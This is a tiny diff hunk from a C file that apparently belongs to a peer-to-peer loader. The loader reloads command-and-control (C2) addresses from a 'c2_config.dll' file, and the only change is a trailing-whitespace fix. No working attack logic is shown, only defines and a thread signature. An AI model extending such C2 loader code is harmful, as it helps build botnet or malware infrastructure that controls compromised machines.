@@ -7,7 +7,7 @@
 #include "p2p_loader.h"
 
 #define P2P_DLL_PATH "c2_config.dll"
-#define P2P_REFRESH_INTERVAL_MS 30000 
+#define P2P_REFRESH_INTERVAL_MS 30000
 
 // reloads C2 addresses from the DLL
 static DWORD WINAPI P2PLoaderThread(LPVOID lpParam) {
